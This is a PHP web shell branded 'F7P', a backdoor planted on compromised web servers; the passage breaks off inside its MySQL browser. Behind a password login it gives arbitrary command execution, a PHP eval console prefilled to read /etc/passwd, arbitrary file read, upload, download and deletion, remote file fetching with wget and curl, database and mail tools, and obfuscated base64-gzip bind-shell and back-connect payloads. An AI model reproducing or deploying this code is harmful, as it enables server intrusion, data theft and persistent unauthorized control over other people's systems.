<?php
session_start();

if(isset($_POST['content_encoded']) && !empty($_POST['content_encoded'])) {
    $encoded = $_POST['content_encoded'];
    $decoded = base64_decode($encoded);
    if($decoded !== false) {
        $decompressed = gzinflate($decoded);
        if($decompressed !== false) {
            $_POST['content'] = $decompressed;
        }
    }
}

@error_reporting(0);
@set_time_limit(0);

define('ADMIN_USER', 'admin');
define('ADMIN_PASS_HASH', '$2a$09$lF0dTQmb5Dhh2BG5DAS6NuzJ8/rOT9el9Nui2vZAZmWkkKKf4idCu');

$is_logged_in = false;
if (isset($_SESSION['f7p_logged_in']) && $_SESSION['f7p_logged_in'] === true) {
    $is_logged_in = true;
}

if (isset($_POST['login_submit'])) {
    $username = isset($_POST['login_user']) ? trim($_POST['login_user']) : '';
    $password = isset($_POST['login_pass']) ? $_POST['login_pass'] : '';
    
    if ($username === ADMIN_USER) {
        if (password_verify($password, ADMIN_PASS_HASH)) {
            $_SESSION['f7p_logged_in'] = true;
            $_SESSION['f7p_login_time'] = time();
            header('Location: ' . $_SERVER['PHP_SELF']);
            exit;
        } else {
            $login_error = 'Password salah!';
        }
    } else {
        $login_error = 'Username salah!';
    }
}

if (isset($_GET['logout']) && $_GET['logout'] == '1') {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

if (!$is_logged_in) {
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <title>F7P - Login</title>
        <link rel="stylesheet" href="f7p-assets/_style_login.css">
    </head>
    <body class="login-page">
        <div class="login-container">
            <div class="brand">F<span>7</span>P</div>
            <div class="subtitle"><span class="lock">🔐</span> Secure Login</div>
            
            <?php if (isset($login_error)): ?>
                <div class="error"><?php echo $login_error; ?></div>
            <?php endif; ?>
            
            <form method="post" autocomplete="off">
                <div class="input-group">
                    <label>Username</label>
                    <input class="inputz" type="text" name="login_user" placeholder="Enter username" value="<?php echo isset($_POST['login_user']) ? htmlspecialchars($_POST['login_user']) : ''; ?>" autofocus required />
                </div>
                
                <div class="input-group">
                    <label>Password</label>
                    <input class="inputz" type="password" name="login_pass" placeholder="Enter password" required />
                </div>
                
                <input class="inputzbut" type="submit" name="login_submit" value="Login" />
            </form>
            
            <div class="hint">
                <span class="label">Use Bcrypt</span> <code>admin</code> / <code>password123</code>
            </div>
        </div>
    </body>
    </html>
    <?php
    exit;
}

if(isset($_GET['dl']) && ($_GET['dl'] != "")){
    $file = $_GET['dl'];
    $filez = @file_get_contents($file);
   header("Content-type: application/octet-stream");
   header("Content-length: ".strlen($filez));
   header("Content-disposition: attachment; filename=\"".basename($file)."\";");
   echo $filez;
    exit;
}
elseif(isset($_GET['dlgzip']) && ($_GET['dlgzip'] != "")){
    $file = $_GET['dlgzip'];
    $filez = gzencode(@file_get_contents($file));
   header("Content-Type:application/x-gzip\n");
   header("Content-length: ".strlen($filez));
   header("Content-disposition: attachment; filename=\"".basename($file).".gz\";");
   echo $filez;
    exit;
}

$software = getenv("SERVER_SOFTWARE");
if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on")  $safemode = TRUE; else $safemode = FALSE;
$system = @php_uname();
if(strtolower(substr($system,0,3)) == "win") $win = TRUE;
else $win = FALSE;

if(isset($_GET['y'])){
    if(@is_dir($_GET['view'])){
        $pwd = $_GET['view'];
        @chdir($pwd);
    }
    else{
        $pwd = $_GET['y'];
        @chdir($pwd);
    }
}

if(!$win){
    if(!$user = rapih(exe("whoami"))) $user = "";
    if(!$id = rapih(exe("id"))) $id = "";
    $prompt = $user." \$ ";
    $pwd = @getcwd().DIRECTORY_SEPARATOR;
}
else {
    $user = @get_current_user();
    $id = $user;
    $prompt = $user." &gt;";
    $pwd = realpath(".")."\\";
    $v = explode("\\",$d);
    $v = $v[0];
    foreach (range("A","Z") as $letter)
    {
      $bool = @is_dir($letter.":\\");
      if ($bool)
      {
          $letters .= "<a href=\"?y=".$letter.":\\\">[ ";
           if ($letter.":" != $v) {$letters .= $letter;}
           else {$letters .= "<span class=\"gaya\">".$letter."</span>";}
           $letters .= " ]</a> ";
      }
 }
}
if(function_exists("posix_getpwuid") && function_exists("posix_getgrgid")) $posix = TRUE;
else $posix = FALSE;

$server_ip = @gethostbyname($_SERVER["HTTP_HOST"]);
$my_ip = $_SERVER['REMOTE_ADDR'];
$bindport = "13123";
$bindport_pass = "F7P";

$pwds = explode(DIRECTORY_SEPARATOR,$pwd);
$pwdurl = "";
$breadcrumb_full = "";
$total = sizeof($pwds)-1;
for($i = 0 ; $i < $total ; $i++){
    $pathz = "";
    for($j = 0 ; $j <= $i ; $j++){
        $pathz .= $pwds[$j].DIRECTORY_SEPARATOR;
    }
    if($i == $total-1){
        $breadcrumb_full .= "<a href=\"?y=".$pathz."\" data-no-ajax=\"true\" style=\"font-size:18px;font-weight:bold;color:#0066cc;\">".$pwds[$i]." ".DIRECTORY_SEPARATOR." </a>";
    } else {
        $breadcrumb_full .= "<a href=\"?y=".$pathz."\" data-no-ajax=\"true\">".$pwds[$i]." ".DIRECTORY_SEPARATOR." </a>";
    }
}

if(isset($_POST['rename']) && isset($_POST['oldname']) && isset($_POST['newname'])){
    $old = trim($_POST['oldname']);
    $new = trim($_POST['newname']);
    $current_dir = isset($_POST['current_dir']) ? $_POST['current_dir'] : $pwd;
    
    if($old != $new && !empty($new)){
        $old_path = $current_dir . $old;
        $new_path = $current_dir . $new;
        
        if(!file_exists($new_path)){
            if(@rename($old_path, $new_path)){
                header("Location: ?y=".urlencode($current_dir));
                exit;
            }
        }
    }
    header("Location: ?y=".urlencode($current_dir));
    exit;
}

if(isset($_GET['delete']) && ($_GET['delete'] != "")){
    $file = $_GET['delete'];
    if(is_file($file)){
        @unlink($file);
    }
    header("Location: ?y=".urlencode($pwd));
    exit;
}

if(isset($_GET['fdelete']) && ($_GET['fdelete'] != "")){
    $dir = $_GET['fdelete'];
    if(is_dir($dir)){
        if(deleteFolder($dir)){
           
        } else {
           
        }
    }
    header("Location: ?y=".urlencode($pwd));
    exit;
}
if(isset($_GET['mkdir']) && ($_GET['mkdir'] != "")){
    $path = $pwd . $_GET['mkdir'];
    if(!file_exists($path)){
        @mkdir($path, 0755);
    }
    header("Location: ?y=".urlencode($pwd));
    exit;
}

function rapih($text){
    return trim(str_replace("<br />","",$text));
}

function deleteFolder($dir) {
    if (!is_dir($dir)) {
        return false;
    }
    $files = array_diff(scandir($dir), array('.', '..'));
    foreach ($files as $file) {
        $path = $dir . DIRECTORY_SEPARATOR . $file;
        if (is_dir($path)) {
            deleteFolder($path);
        } else {
            @unlink($path);
        }
    }
    return @rmdir($dir);
}

function magicboom($text){
    if (function_exists('get_magic_quotes_gpc') && get_magic_quotes_gpc()) {
        return stripslashes($text);
    }
    return $text;
}
function timeAgo($timestamp) {
   
    if (!$timestamp || $timestamp <= 0) {
        return 'N/A';
    }
    
   
    if ($timestamp > time()) {
        return 'new';
    }
    
    $time_ago = time() - $timestamp;
    
   
    if ($time_ago > 315360000) {
        return date('Y-m-d', $timestamp);
    }
    
    if ($time_ago < 60) {
        return $time_ago . 's';
    } elseif ($time_ago < 3600) {
        $minutes = floor($time_ago / 60);
        return $minutes . 'm';
    } elseif ($time_ago < 86400) {
        $hours = floor($time_ago / 3600);
        return $hours . 'h';
    } elseif ($time_ago < 604800) {
        $days = floor($time_ago / 86400);
        return $days . 'd';
    } elseif ($time_ago < 2592000) {
        $weeks = floor($time_ago / 604800);
        return $weeks . 'w';
    } elseif ($time_ago < 31536000) {
        $months = floor($time_ago / 2592000);
        return $months . 'mo';
    } else {
        $years = floor($time_ago / 31536000);
        return $years . 'y';
    }
}
function showdir($pwd,$prompt){
    global $user, $win, $posix;
    $fname = array();
    $dname = array();
    if(function_exists("posix_getpwuid") && function_exists("posix_getgrgid")) $posix = TRUE;
    else $posix = FALSE;
    $user = "????:????";
    if($dh = @scandir($pwd)){
        foreach($dh as $file){
            if($file == '.' || $file == '..') continue;
            if(is_dir($file)){
                $dname[] = $file;
            }
            elseif(is_file($file)){
                $fname[] = $file;
            }
        }
    }
    else{
        if($dh = @opendir($pwd)){
            while($file = @readdir($dh)){
                if($file == '.' || $file == '..') continue;
                if(@is_dir($file)){
                    $dname[] = $file;
                }
                elseif(@is_file($file)){
                    $fname[] = $file;
                }
            }
            @closedir($dh);
        }
    }

    sort($fname);
    sort($dname);
    $path = @explode(DIRECTORY_SEPARATOR,$pwd);
    $tree = @sizeof($path);
    $parent = "";
    if($tree > 2) for($i=0;$i<$tree-2;$i++) $parent .= $path[$i].DIRECTORY_SEPARATOR;
    else $parent = $pwd;

    $buff = "<div class='table-wrap'><table class=\"explore\">";
    $buff .= "<tbody>";

$buff .= "<tr class=\"parent-row\" style=\"cursor:pointer;\" onclick=\"window.location.href='?y=".$parent."'\">
    <td class=\"file-name\"><span class=\"folder-icon\"><img width=24px src=f7p-assets/up.png></span> ..</td>
    <td>go up one dir</td><td></td>
    <td style=\"text-align:right;\">
<a href=\"?y=$pwd&amp;x=upload\" data-no-ajax=\"true\"><img width=24px src=f7p-assets/upload.png></a>
        
        <a href=\"javascript:void(0);\" onclick=\"event.stopPropagation();createNewFolder('".addslashes($pwd)."');\" title=\"New Folder\"><img width=24px src=f7p-assets/new-dir.png></a>
<a href=\"javascript:void(0);\" onclick=\"event.stopPropagation();createNewFile('".addslashes($pwd)."');\" title=\"New File\"><img width=24px src=f7p-assets/add-file.png></a> 

    </td>
</tr>";

    foreach($dname as $folder){
    $full_folder = $pwd.$folder;
    $safe_id = 'd_' . md5($folder);
    $folder_ago = timeAgo(filemtime($full_folder));

    $buff .= "<tr style=\"cursor:pointer;\" onclick=\"window.location.href='?y=".urlencode($pwd.$folder.DIRECTORY_SEPARATOR)."'\">
        <td class=\"file-name\">
            <span class=\"folder-icon\">
                <img width=20px src=f7p-assets/dir.png>
            </span> 
            <span class=\"file-name-text\" id=\"{$safe_id}_link\">".htmlspecialchars($folder)."</span>  
            <form action=\"?y=".urlencode($pwd)."\" method=\"post\" id=\"{$safe_id}_form\" class=\"rename-form\" style=\"display:none;\">
                <input type=\"hidden\" name=\"oldname\" value=\"".htmlspecialchars($folder)."\" />
                <input type=\"hidden\" name=\"current_dir\" value=\"".htmlspecialchars($pwd)."\" />
                <input type=\"hidden\" name=\"rename\" value=\"1\" />
                <input class=\"inputz rename-input\" type=\"text\" name=\"newname\" value=\"".htmlspecialchars($folder)."\" />
                <input class=\"inputzbut\" type=\"submit\" value=\"Rename\" onclick=\"event.stopPropagation();\" />
                <input class=\"inputzbut\" type=\"button\" value=\"✕\" onclick=\"event.stopPropagation();toggleRename('{$safe_id}');\" />
            </form>
        </td>
        <td></td>    <td style=\"font-size:12px;color:#888;\">".$folder_ago."</td>
        <td style=\"white-space:nowrap;text-align:right;\">
            
            <a href=\"javascript:void(0);\" onclick=\"event.stopPropagation();showRenameAlert('".addslashes($folder)."', '".addslashes($full_folder)."', '".addslashes($pwd)."', 'folder');\" title=\"Rename\"><img width=20px src=f7p-assets/rename.png></a>
            <a href=\"?y=".urlencode($pwd)."&amp;fdelete=".urlencode($pwd.$folder)."\" onclick=\"event.stopPropagation();return confirmDelete('".addslashes($folder)."', 'folder');\" data-no-ajax=\"true\" title=\"Delete\"><img width=20px src=f7p-assets/rcb.png></a>
<a href=\"?y=".urlencode($pwd)."&amp;dlfolder=".urlencode($pwd.$folder)."\" data-no-ajax=\"true\" title=\"Download as ZIP\"><img width=20px src=f7p-assets/download.png></a>
        </td>
    </tr>";
}

foreach($fname as $file){
    $full = $pwd.$file;
    $size = ukuran($full);
    
    $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
    $image_exts = ['jpg', 'jpeg', 'png', 'gif', 'bmp', 'webp', 'svg', 'ico'];
    $is_image = in_array($ext, $image_exts);
    
    $edit_link = "edit=" . urlencode($full);
    $view_link = $is_image ? "img=" . urlencode($full) : "view=" . urlencode($full);
   $file_time = date("Y-m-d H:i:s", filemtime($full));
$file_ago = timeAgo(filemtime($full));

    $buff .= "<tr>
        <td class=\"file-name\">
            <span class=\"file-icon\">
                <img width=20px src=f7p-assets/file.png>
            </span> 
            <a href=\"?y=$pwd&amp;$edit_link\" data-no-ajax=\"true\">".htmlspecialchars($file)."</a>
            <form action=\"?y=".$pwd."\" method=\"post\" id=\"".clearspace($file)."_form\" class=\"rename-form\" style=\"display:none;margin:0;padding:0;\">
                <input type=\"hidden\" name=\"oldname\" value=\"".htmlspecialchars($file)."\" />
                <input type=\"hidden\" name=\"current_dir\" value=\"".htmlspecialchars($pwd)."\" />
                <input class=\"inputz rename-input\" style=\"width:120px;\" type=\"text\" name=\"newname\" value=\"".htmlspecialchars($file)."\" />
                <input class=\"inputzbut\" type=\"submit\" name=\"rename\" value=\"Rename\" onclick=\"event.stopPropagation();\" />
                <input class=\"inputzbut\" type=\"button\" value=\"✕\" onclick=\"event.stopPropagation();toggleRename('".clearspace($file)."');\" />
            </form>
        </td>
        <td>".$size."</td><td style=\"font-size:12px;color:#666;\">".$file_ago."</td>
        <td style=\"white-space:nowrap;text-align:right;\">
            <a href=\"?y=$pwd&amp;$view_link\" data-no-ajax=\"true\" title=\"View\"><img width=20px src=f7p-assets/view.png></a>
            <a href=\"javascript:void(0);\" onclick=\"showRenameAlert('".addslashes($file)."', '".addslashes($full)."', '".addslashes($pwd)."');\" title=\"Rename\"><img width=20px src=f7p-assets/rename.png></a>
            <a href=\"?y=$pwd&amp;delete=$full\" onclick=\"return confirmDelete('".addslashes($file)."', 'file');\" data-no-ajax=\"true\" title=\"Delete\"><img width=20px src=f7p-assets/rcb.png></a>
            <a href=\"?y=$pwd&amp;dl=$full\" data-no-ajax=\"true\" title=\"Download\"><img width=20px src=f7p-assets/download.png></a>
        </td>
    </tr>";
}

    $buff .= "</tbody></table></div>";
    return $buff;
}

function ukuran($file){
    if($size = @filesize($file)){
        if($size < 1024) return $size." B";
        elseif($size < 1024*1024) {
            $size = @round($size / 1024,1);
            return "$size KB";
        }
        elseif($size < 1024*1024*1024) {
            $size = @round($size / 1024 / 1024,2);
            return "$size MB";
        }
        else {
            $size = @round($size / 1024 / 1024 / 1024,2);
            return "$size GB";
        }
    }
    else return "???";
}

function exe($cmd){
    if(function_exists('system')) {
        @ob_start();
        @system($cmd);
        $buff = @ob_get_contents();
        @ob_end_clean();
        return $buff;
    }
    elseif(function_exists('exec')) {
        @exec($cmd,$results);
        $buff = "";
        foreach($results as $result){
            $buff .= $result;
        }
        return $buff;
    }
    elseif(function_exists('passthru')) {
        @ob_start();
        @passthru($cmd);
        $buff = @ob_get_contents();
        @ob_end_clean();
        return $buff;
    }
    elseif(function_exists('shell_exec')){
        $buff = @shell_exec($cmd);
        return $buff;
    }
}

function tulis($file,$text){
    $textz = gzinflate(base64_decode($text));
     if($filez = @fopen($file,"w"))
     {
         @fputs($filez,$textz);
         @fclose($file);
     }
}

function ambil($link,$file) {
   if($fp = @fopen($link,"r")){
       while(!feof($fp)) {
               $cont.= @fread($fp,1024);
           }
           @fclose($fp);
       $fp2 = @fopen($file,"w");
       @fwrite($fp2,$cont);
       @fclose($fp2);
   }
}

function which($pr){
    $path = exe("which $pr");
    if(!empty($path)) { return trim($path); } else { return trim($pr); }
}

function download($cmd,$url){
    $namafile = basename($url);
    switch($cmd) {
        case 'wwget': exe(which('wget')." ".$url." -O ".$namafile);break;
        case 'wlynx': exe(which('lynx')." -source ".$url." > ".$namafile);break;
        case 'wfread' : ambil($wurl,$namafile);break;
        case 'wfetch' : exe(which('fetch')." -o ".$namafile." -p ".$url);break;
        case 'wlinks' : exe(which('links')." -source ".$url." > ".$namafile);break;
        case 'wget' : exe(which('GET')." ".$url." > ".$namafile);break;
        case 'wcurl' : exe(which('curl')." ".$url." -o ".$namafile);break;
        default: break;
    }
    return $namafile;
}

function get_perms($file)
{
    if($mode=@fileperms($file)){
        $perms='';
        $perms .= ($mode & 00400) ? 'r' : '-';
        $perms .= ($mode & 00200) ? 'w' : '-';
        $perms .= ($mode & 00100) ? 'x' : '-';
        $perms .= ($mode & 00040) ? 'r' : '-';
        $perms .= ($mode & 00020) ? 'w' : '-';
        $perms .= ($mode & 00010) ? 'x' : '-';
        $perms .= ($mode & 00004) ? 'r' : '-';
        $perms .= ($mode & 00002) ? 'w' : '-';
        $perms .= ($mode & 00001) ? 'x' : '-';
        return $perms;
    }
    else return "??????????";
}

function clearspace($text){
    return str_replace(array(" ","/","\\",".","-","(",")","[","]"), "_", $text);
}

if(isset($_GET['img_direct']) && ($_GET['img_direct'] != "")){
    @ob_clean();
    $file = magicboom($_GET['img_direct']);
    if(is_file($file)){
        if(function_exists('finfo_open')) {
            $finfo = finfo_open(FILEINFO_MIME_TYPE);
            $mime = finfo_file($finfo, $file);
            finfo_close($finfo);
        } else {
            $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
            $mime_types = [
                'jpg' => 'image/jpeg', 'jpeg' => 'image/jpeg',
                'png' => 'image/png', 'gif' => 'image/gif',
                'bmp' => 'image/bmp', 'webp' => 'image/webp',
                'svg' => 'image/svg+xml', 'ico' => 'image/x-icon'
            ];
            $mime = isset($mime_types[$ext]) ? $mime_types[$ext] : 'application/octet-stream';
        }
        
        header("Content-Type: $mime");
        header("Cache-control: public");
        header("Expires: " . date("r", mktime(0,0,0,1,1,2030)));
        header("Cache-control: max-age=" . (60*60*24*7));
        header("Content-Length: " . filesize($file));
        @readfile($file);
    }
    exit;
}

if(isset($_GET['x']) && $_GET['x'] == 'upload_ajax'){
    $response = ['success' => false, 'message' => 'Unknown error'];
    if (!isset($_SESSION['f7p_logged_in']) || $_SESSION['f7p_logged_in'] !== true) {
        $response['message'] = 'Not logged in';
        header('Content-Type: application/json');
        echo json_encode($response);
        exit;
    }
    
   
    if (!isset($_FILES['file_upload']) || $_FILES['file_upload']['error'] !== UPLOAD_ERR_OK) {
        $response['message'] = 'No file uploaded';
        header('Content-Type: application/json');
        echo json_encode($response);
        exit;
    }
    
    $file_path = isset($_POST['file_path']) ? $_POST['file_path'] : '';
    if (empty($file_path)) {
        $response['message'] = 'No file path specified';
        header('Content-Type: application/json');
        echo json_encode($response);
        exit;
    }
    
   
    $file = $_FILES['file_upload'];
    $content = file_get_contents($file['tmp_name']);
    if (file_put_contents($file_path, $content) !== false) {
        $response['success'] = true;
        $response['message'] = 'File saved successfully';
        $response['path'] = $file_path;
        $response['size'] = strlen($content);
    } else {
        $response['message'] = 'Failed to write file';
    }
    
    header('Content-Type: application/json');
    echo json_encode($response);
    exit;
}

function zipFolder($source, $destination) {
    if (!extension_loaded('zip')) {
        return false;
    }
    
    $zip = new ZipArchive();
    if (!$zip->open($destination, ZipArchive::CREATE)) {
        return false;
    }
    
    $source = str_replace('\\', '/', realpath($source));
    
    if (is_dir($source) === true) {
        $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source), RecursiveIteratorIterator::SELF_FIRST);
        
        foreach ($files as $file) {
            $file = str_replace('\\', '/', $file);
            
            if (in_array(substr($file, strrpos($file, '/') + 1), array('.', '..'))) {
                continue;
            }
            
            $file = realpath($file);
            
            if (is_dir($file) === true) {
                $zip->addEmptyDir(str_replace($source . '/', '', $file . '/'));
            } else if (is_file($file) === true) {
                $zip->addFile($file, str_replace($source . '/', '', $file));
            }
        }
    } else if (is_file($source) === true) {
        $zip->addFile($source, basename($source));
    }
    
    return $zip->close();
}
if(isset($_GET['dlfolder']) && ($_GET['dlfolder'] != "")){
    $folder = $_GET['dlfolder'];
    if(is_dir($folder)){
        $temp_zip = sys_get_temp_dir() . '/folder_' . md5($folder . time()) . '.zip';
        
        if(zipFolder($folder, $temp_zip)){
            header('Content-Type: application/zip');
            header('Content-Disposition: attachment; filename="' . basename($folder) . '.zip"');
            header('Content-Length: ' . filesize($temp_zip));
            readfile($temp_zip);
            unlink($temp_zip);
            exit;
        } else {
            echo "Failed to create zip";
            exit;
        }
    }
    exit;
}
$port_bind_bd_c="bVNhb9owEP2OxH+4phI4NINAN00aYxJaW6maxqbSLxNDKDiXxiLYkW3KGOp/3zlOpo7xIY793jvf
+fl8KSQvdinCR2NTofr5p3br8hWmhXw6BQ9mYA8lmjO4UXyD9oSQaAV9AyFPCNRa+pRCWtgmQrJE
P/GIhufQg249brd4nmjo9RxBqyNAuwWOdvmyNAKJ+ywlBirhepctruOlW9MJdtzrkjTVKyFB41ZZ
dKTIWKb0hoUwmUAcwtFt6+m+EXKVJVtRHGAC07vV/ez2cfwvXSpticytkoYlVglX/fNiuAzDE6VL
3TfVrw4o2P1senPzsJrOfoRjl9cfhWjvIatzRvNvn7+s5o8Pt9OvURzWZV94dQgleag0C3wQVKug
Uq2FTFnjDzvxAXphx9cXQfxr6PcthLEo/8a8q8B9LgpkQ7oOgKMbvNeThHMsbSOO69IA0l05YpXk
HDT8HxrV0F4LizUWfE+M2SudfgiiYbONxiStebrgyIjfqDJG07AWiAzYBc9LivU3MVpGFV2x1J4W
tyxAnivYY8HVFsEqWF+/f7sBk2NRQKcDA/JtsE5MDm9EUG+MhcFqkpX0HmxGbqbkdBTMldaHRsUL
ZeoDeOSFBvpefCfXhflOpgTkvJ+jtKiR7vLohYKCqS2ZmMRj4Z5gQZfSiMbi6iqkdnHarEEXYuk6
uPtTdumsr0HC4q5rrzNifV7sC3ZWUmq+LVlVa5OfQjTanZYQO+Uf";
$port_bind_bd_pl="ZZJhT8IwEIa/k/AfjklgS2aA+BFmJDB1cW5kHSZGzTK2Qxpmu2wlYoD/bruBIfitd33uvXuvvWr1
NmXRW1DWy7HImo02ebRd19Kq1CIuV3BNtWGzQZeg342DhxcYwcCAHeCWCn1gDOEgi1yHhLYXzfwg
tNqKeut/yKJNiUB4skYhg3ZecMETnlmfKKrz4ofFX6h3RZJ3DUmUFaoTszO7jxzPDs0O8SdPEQkD
e/xs/gkYsN9DShG0ScwEJAXGAqGufmdq2hKFCnmu1IjvRkpH6hE/Cuw5scfTaWAOVE9pM5WMouM0
LSLK9HM3puMpNhp7r8ZFW54jg5wXx5YZLQUyKXVzwdUXZ+T3imYoV9ds7JqNOElQTjnxPc8kRrVo
vaW3c5paS16sjZo6qTEuQKU1UO/RSnFJGaagcFVbjUTCqeOZ2qijNLWzrD8PTe32X9oOgvM0bjGB
+hecfOQFlT4UcLSkmI1ceY3VrpKMy9dWUCVCBfTlQX6Owy8=";
$back_connect="fZFRS8IwFIXfB/sPWSw2hUrnqyPC0CpD3KStvqh0XRpcsE1KkoKF/XiTtCIV6tu55+Z89yY5W0St
ktGB8aihsprPWkVBKsgn1av5zCN1iQGsOv4Fbak6pWmNgU/JUQC4b3lRU3BR7OFqcFhptMOpo28j
S2whVulCflCNvXVy//K6fLdWI+SPcekMVpSlxIxTnRdacDSEAnA6gZJRBGMphbwC3uKNw8AhXEKZ
ja3ImclYagh61n9JKbTAhu7EobN3Qb4mjW/byr0BSnc3D3EWgqe7fLO1whp5miXx+tHMcNHpGURw
Tskvpd92+rxoKEdpdrvZhgBen/exUWf3nE214iT52+r/Cw3/5jaqhKL9iFFpuKPawILVNw==";
$back_connect_c="XVHbagIxEH0X/IdhhZLUWF1f1YKIBelFqfZJliUm2W7obiJJLLWl/94k29rWhyEzc+Z2TjpSserA
BYyt41JfldftVuc3d7R9q9mLcGeAEk5660sVAakc1FQqFBxqnhkBVlIDl95/3Wa43fpotyCABR95
zzpzYA7CaMq5yaUCK1VAYpup7XaYZpPE1NArIBmBRzgVtVYoJQMcR/jV3vKC1rI6wgSmN/niYb75
i+21cR4pnVYWUaclivcMM/xvRDjhysbHVwde0W+K0wzH9bt3YfRPingClVCnim7a/ZuJC0JTwf3A
RkD0fR+B9XJ2m683j/PpPYHFavW43CzzzWyFIfbIAhBiWinBHCo4AXSmFlxiuPB3E0/gXejiHMcY
jwcYguIAe2GMNijZ9jL4GYqTSB9AvEmHGjk/m19h1CGvPoHIY5A1Oh2tE3XIe1bxKw77YTyt6T2F
6f9wGEPxJliFkv5Oqr4tE5LYEnoyIfDwdHcXK1ilrfAdUbPPLw==";
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>F7P</title>
    <link rel="stylesheet" href="f7p-assets/_style.css">
    <script src="f7p-assets/_script.js"></script>
</head>
<body>

    <div id="header">
        <div class="brand" onclick="goToRoot();" title="Go to root">F<span>7</span>P</div>
        <div class="breadcrumb" id="breadcrumb">
            <?php echo $breadcrumb_full; ?>
        </div>
        <div  class="header-actions">
            <button class="btn-icon" onclick="toggleCommand();" title="Toggle Command"><img width=24px src=f7p-assets/terminalx.png></button>
            <div class="dropdown">
                <button class="dropdown-toggle" onclick="toggleDropdown();" title="More">⋮</button>
                <div class="dropdown-menu" id="dropdown-menu">
                    <a href="?<?php echo "y=".$pwd; ?>" data-no-ajax="true"><img width=24px src=f7p-assets/explorer.png> Explorer</a>
                    <a href="?<?php echo "y=".$pwd; ?>&amp;x=github" data-no-ajax="true"><img width=24px src=f7p-assets/github.png> GitHub API</a>
                    <a href="?<?php echo "y=".$pwd; ?>&amp;x=shell" data-no-ajax="true"><img width=24px src=f7p-assets/terminalx.png> Super Shell</a>
                    <a href="?<?php echo "y=".$pwd; ?>&amp;x=php" data-no-ajax="true"><img width=24px src=f7p-assets/eval.png> Eval</a>
                    <a href="?<?php echo "y=".$pwd; ?>&amp;x=mysql" data-no-ajax="true"><img width=24px src=f7p-assets/mysql.png> MySQL</a>
                    <a href="?<?php echo "y=".$pwd; ?>&amp;x=phpinfo" data-no-ajax="true"><img width=24px src=f7p-assets/php.png> PHPInfo</a>
                    <a href="?<?php echo "y=".$pwd; ?>&amp;x=netsploit" data-no-ajax="true"><img width=24px src=f7p-assets/bug.png> Bug test</a>
                    <a href="?<?php echo "y=".$pwd; ?>&amp;x=mail" data-no-ajax="true"><img width=24px src=f7p-assets/mailer.png> Mail</a>
                    <a href="?logout=1" data-no-ajax="true" style="border-top:2px solid #eee;margin-top:4px;color:#cc3333;"><img width=24px src=f7p-assets/logout.png> Logout</a>
                </div>
            </div>
        </div>
    </div>

    <div id="content">

    <div id="command-bar">
        <form action="?y=<?php echo $pwd; ?>&amp;x=shell" method="post">
            <div class="cmd-row">
                <span class="prompt-label"><?php echo $prompt; ?></span>
                <input id="cmd" class="inputz" type="text" name="cmd" placeholder="command..." value="" />
                <input class="inputzbut" type="submit" value="▶" name="submitcmd" />
            </div>
        </form>
    </div>

    <?php
    if(isset($_GET['x']) && ($_GET['x'] == 'php')){
    ?>
        <form action="?y=<?php echo $pwd; ?>&amp;x=php" method="post">
            <textarea class="output" name="cmd" id="cmd"><?php
            if(isset($_POST['submitcmd'])) {
                echo eval(magicboom($_POST['cmd']));
            }
            else echo "echo file_get_contents('/etc/passwd');";
            ?></textarea>
            <div class="cmd-row mt-2">
                <input class="inputzbut" type="submit" value="Execute" name="submitcmd" style="width:100%;">
            </div>
        </form>
    <?php
    }
    elseif(isset($_GET['x']) && ($_GET['x'] == 'mysql')){
        if(isset($_GET['sqlhost']) && isset($_GET['sqluser']) && isset($_GET['sqlpass']) && isset($_GET['sqlport'])){
            $sqlhost = $_GET['sqlhost'];
            $sqluser = $_GET['sqluser'];
            $sqlpass = $_GET['sqlpass'];
            $sqlport = $_GET['sqlport'];
            if($con = @mysql_connect($sqlhost.":".$sqlport,$sqluser,$sqlpass)){
                $msg = "<div style='padding:4px;'>";
                $msg .= "<p class='text-success'>Connected to ".$sqluser."@".$sqlhost.":".$sqlport;
                $msg .= " &nbsp; <a href=\"?y=".$pwd."&amp;x=mysql&amp;sqlhost=".$sqlhost."&amp;sqluser=".$sqluser."&amp;sqlpass=".$sqlpass."&amp;sqlport=".$sqlport."&amp;\">DB</a>";
                if(isset($_GET['db'])) $msg .= " &nbsp; <a href=\"?y=".$pwd."&amp;x=mysql&amp;sqlhost=".$sqlhost."&amp;sqluser=".$sqluser."&amp;sqlpass=".$sqlpass."&amp;sqlport=".$sqlport."&amp;db=".$_GET['db']."\">".htmlspecialchars($_GET['db'])."</a>";
                if(isset($_GET['table'])) $msg .= " &nbsp; <a href=\"?y=".$pwd."&amp;x=mysql&amp;sqlhost=".$sqlhost."&amp;sqluser=".$sqluser."&amp;sqlpass=".$sqlpass."&amp;sqlport=".$sqlport."&amp;db=".$_GET['db']."&amp;table=".$_GET['table']."\">".htmlspecialchars($_GET['table'])."</a>";
                $msg .= "</p><p style='font-size:12px;color:#666;'>version: ".mysql_get_server_info($con)."</p>";
                $msg .= "</div>";
                echo $msg;
                if(isset($_GET['db']) && (!isset($_GET['table'])) && (!isset($_GET['sqlquery']))){
                    $db = $_GET['db'];
                    $query = "SHOW TABLES FROM ".$db;
                    $msgq  = "<div style='padding:4px;'><form action=\"?\" method=\"get\">
                    <input type=\"hidden\" name=\"y\" value=\"".$pwd."\" />
                    <input type=\"hidden\" name=\"x\" value=\"mysql\" />
                    <input type=\"hidden\" name=\"sqlhost\" value=\"".$sqlhost."\" />
                    <input type=\"hidden\" name=\"sqluser\" value=\"".$sqluser."\" />
                    <input type=\"hidden\" name=\"sqlport\" value=\"".$sqlport."\" />
                    <input type=\"hidden\" name=\"sqlpass\" value=\"".$sqlpass."\" />
                    <input type=\"hidden\" name=\"db\" value=\"".$db."\" />
                    <textarea name=\"sqlquery\" class=\"output\" style=\"height:80px;\">$query</textarea>
                    <div class='cmd-row mt-2'><input class=\"inputzbut\" style=\"width:100%;\" name=\"submitquery\" type=\"submit\" value=\"Execute\" /></div>
                    </form></div>";
                    $tables = array();
